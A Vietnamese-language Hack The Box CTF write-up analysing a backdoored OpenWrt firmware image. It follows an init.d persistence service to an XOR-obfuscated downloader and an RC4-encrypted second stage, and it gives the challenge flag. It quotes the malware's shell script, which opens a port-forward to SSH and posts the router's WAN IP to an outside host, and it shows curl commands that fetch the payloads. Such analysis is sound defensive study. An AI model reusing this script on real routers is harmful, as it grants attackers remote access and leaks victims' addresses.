# zombienet-htb-med(disk-openWrt router-maintain access-/etc/init.d/

![image.png](zombienet-htb-med%28disk-openWrt%20router-maintain%20acc/image.png)

Bài này cung cấp cho chúng ta 1 file .bin là  firmware router OpenWrt cái này cũng coi như là 1 bài disk imgae như thường lện mình sẽ mở lên bằng autopsy 

Ở bài này các bạn biết bài có nhắc đến la maitain access nên là mình sẽ nghĩ đến việc và truy cập vào 

/etc/init.d/

![image.png](zombienet-htb-med%28disk-openWrt%20router-maintain%20acc/image%201.png)

Khi mà vào các bạn sẽ thấy một tiến trình lạ nó khỏi động khá muộn so với hệ thống 

- `START=95`: service chạy khá muộn trong boot process.
- `USE_PROCD=1`: dùng `procd` của OpenWrt để quản lý tiến trình.
- `PROG=/sbin/zombie_runner`: chương trình thật sự được chạy là **`/sbin/zombie_runner`**.
- `procd_set_param respawn ...`: **nếu process chết thì tự bật lại**.

Đây chính là cơ chế **maintain access / persistence**

Tiếp mình sẽ men theo đường dẫn để xem cái gì được khỏi đông 

![image.png](zombienet-htb-med%28disk-openWrt%20router-maintain%20acc/image%202.png)

- chạy vô hạn `while [ 1 ]`
- mỗi vòng sẽ gọi:

/usr/bin/dead-reanimation

- xong ngủ **600 giây = 10 phút**
- rồi chạy lại tiếp

TIếp lại xem file dead-reanimation

![image.png](zombienet-htb-med%28disk-openWrt%20router-maintain%20acc/image%203.png)

Ở đây mọi người sẽ thấy nó là 1 fiel elf thưc thi nên là mình sẽ export nó ra và mở bằng ida xem nó làm gì

v4[0] = -1703975440;
v4[1] = -1376459650;
v4[2] = 1318285417;
v4[3] = -1899634347;
v4[4] = 989159361;
v5 = 0;
v6[0] = -1703975440;
v6[1] = -1376456066;
v6[2] = 1250707043;
v6[3] = -1870468544;
v7 = 200;
memcpy(v8, dword_400F74, 58);
memcpy(v9, dword_400FB0, 55);
sub_400C04(v4);
sub_400C04(v6);
sub_400C04(v8);
sub_400C04(v9);
if ( access(v4, 0) == -1 )
{
sub_400B20(v8, v4);
chmod(v4, 511);
}
if ( access(v6, 0) == -1 )
{
sub_400B20(v9, v6);
chmod(v6, 511);
}
system(v6);
system(v4);
return 0;
}

`main()` tạo ra **4 chuỗi bị obfuscate**

ở đây v4 mọi ngừi sẽ có thể suy ra

đây do là little endian nên khi dổi ra này ra hex mình cx đã đảo ngược luôn rồi 

- `1703975440` → `F0 65 6F 9A`
- `1376459650` → `7E E4 F4 AD`
- `1318285417` → `69 70 93 4E`
- `1899634347` → `55 E1 C5 8E`
- `989159361` → `C1 5F F5 3A`
- v5 =0

v4= F0 65 6F 9A 7E E4 F4 AD 69 70 93 4E 55 E1 C5 8E C1 5F F5 3A 00

- `1703975440` → `F0 65 6F 9A`
- `1376456066` → `7E F2 F4 AD`
- `1250707043` → `63 46 8C 4A`
- `1870468544` → `40 EA 82 90`
- v7=200 đỏi là là 00c8 đảo là c800

v6= F0 65 6F 9A 7E F2 F4 AD 63 46 8C 4A 40 EA 82 90 C8 00

Ngoài ra v8 v9 là lần lượt là 58 và 55 byte của chuỗi  dword_400F74 dword_400FB0

```python
BOOL __fastcall sub_400C04(int a1)
{
  BOOL result; // $v0
  unsigned int i; // [sp+18h] [+18h]

  for ( i = 0; ; ++i )
  {
    result = i < strlen(a1);
    if ( !result )
      break;
    *(_BYTE *)(a1 + i) ^= *((_BYTE *)dword_400F24 + (int)i % 32);
  }
  return result;
}
```

Tiếp là hàm 400c04 nó 1 hàm xor lấy key là dword-400f24

![image.png](zombienet-htb-med%28disk-openWrt%20router-maintain%20acc/image%204.png)

Ở đây mọi người sẽ thấy được toàn bộ thong tin về v8 v9 và key thong qua dword mội người nhớ là nó dạng little endian nên sẽ cần đảo byte nhé

key: DF1102EA518091CC0D2FE12B348FACE3A02B905E03A2A432EDEE03968357F4B0 

v8: b765769a6bafbeaf6241874253fc8291cf5ee43b718ccc468fc167f3e233abc2ba706c833ce1e5a969708c6559d5f8aed465fa0b30fbf702dd00

v9:b765769a6bafbeaf6241874253fc8291cf5ee43b718ccc468fc171f3e2399dddbe6567c422e8cea64855ae7c79fbf6b7f553df0d339200

lần lượt decode các v4 v6 v8 c9

![image.png](zombienet-htb-med%28disk-openWrt%20router-maintain%20acc/image%205.png)

![image.png](zombienet-htb-med%28disk-openWrt%20router-maintain%20acc/image%206.png)

![image.png](zombienet-htb-med%28disk-openWrt%20router-maintain%20acc/image%207.png)

![image.png](zombienet-htb-med%28disk-openWrt%20router-maintain%20acc/image%208.png)

v4:

v6:

v8:[http://configs.router.htb/dead_reanimated_mNmZTMtNjU3YS00](http://configs.router.htb/dead_reanimated_mNmZTMtNjU3YS00)

v9:[http://configs.router.htb/reanimate.sh_jEzOWMtZTUxOS00](http://configs.router.htb/reanimate.sh_jEzOWMtZTUxOS00)

➜  zombienet curl -H "Host: configs.router.htb" "[http://154.57.164.71:31557/reanimate.sh_jEzOWMtZTUxOS00](http://154.57.164.71:31557/reanimate.sh_jEzOWMtZTUxOS00)"
#!/bin/sh

WAN_IP=$(ip -4 -o addr show pppoe-wan | awk '{print $4}' | cut -d "/" -f 1)
ROUTER_IP=$(ip -4 -o addr show br-lan | awk '{print $4}' | cut -d "/" -f 1)

CONFIG="config redirect         \n\t
option dest 'lan'           \n\t
option target 'DNAT'        \n\t
option name 'share'         \n\t
option src 'wan'            \n\t
option src_dport '61337'    \n\t
option dest_port '22'       \n\t
option family 'ipv4'        \n\t
list proto 'tcpudp'         \n\t
option dest_ip '${ROUTER_IP}'"

echo -e $CONFIG >> /etc/config/firewall
/etc/init.d/firewall restart

curl -X POST -H "Content-Type: application/json" -b "auth_token=SFRCe1owbWIxM3NfaDR2M19pbmY" -d '{"ip":"'${WAN_IP}'"}' [http://configs.router.htb/reanimate%](http://configs.router.htb/reanimate%25)

Ở đây khi mà mình curl đến link của v9 thì thu được một đoạn shell và decoe token thì sẽ ra phần đàu flag

> ➜  zombienet echo 'SFRCe1owbWIxM3NfaDR2M19pbmY' | base64 -d                                                             HTB{Z0mb13s_h4v3_inf%                                                                                                   ➜  zombienet
> 

> ➜  zombienet curl -H "Host: configs.router.htb" "http://154.57.164.71:31557/dead_reanimated_mNmZTMtNjU3YS00"            Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal anyway,
Warning: or consider "--output <FILE>" to save to a file.
➜  zombienet
> 

Tiếp khi mà mình curl đến v8 thì nó báo là phải ghi đè ra file nên mình có chạy lịa

> 
> 
> 
> ➜  zombienet file dead_reanimated
> dead_reanimated: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-mipsel-sf.so.1, with debug_info, not stripped
> ➜  zombienet cat dead_reanimated
> ELP     @4 "p4  (('44@4@  TT@T@ppp@pp��@�@@@AA����@�@00Q�td/lib/ld-musl-mipsel-sf.so.1 ��p�A�
> 
> 0                                                                                            T@
> @A␦A�@$@�@
> ,
> �Appp@X
> pp␦p%p␦�@�2A���o�@���o���oP@␦
> 

Đến đây tiếp tục lại là 1 file elf thực thi tiếp mình lại mở bằng ida

![image.png](zombienet-htb-med%28disk-openWrt%20router-maintain%20acc/image%209.png)

Ở đây mọi người nhìn phần biến dest là một mã hex sau đó dược gọi bằng hàm init_crypto_lib với biến s là 1b byte láy từ unk_4005d0

![image.png](zombienet-htb-med%28disk-openWrt%20router-maintain%20acc/image%2010.png)

vào hàm nầy mình thấy nó gội đến 2 hàm khác mình mở tiếp 2 hàm này

![image.png](zombienet-htb-med%28disk-openWrt%20router-maintain%20acc/image%2011.png)

![image.png](zombienet-htb-med%28disk-openWrt%20router-maintain%20acc/image%2012.png)

Ở đay mọi người sẽ biết nó là mã hóa rc4 giờ mình 27 byte ở und_40050

![image.png](zombienet-htb-med%28disk-openWrt%20router-maintain%20acc/image%2013.png)

s:C5 7C 2B 05 48 90 F3 B7 3F 76 0F 5B 68 7B 62 72 DD F8 01 9B 57 47 1E 6F DF 8C 55

decode

![image.png](zombienet-htb-med%28disk-openWrt%20router-maintain%20acc/image%2014.png)

HTB{Z0mb13s_h4v3_inf3ct3d_0ur_c0mmun1c4t10ns!!}
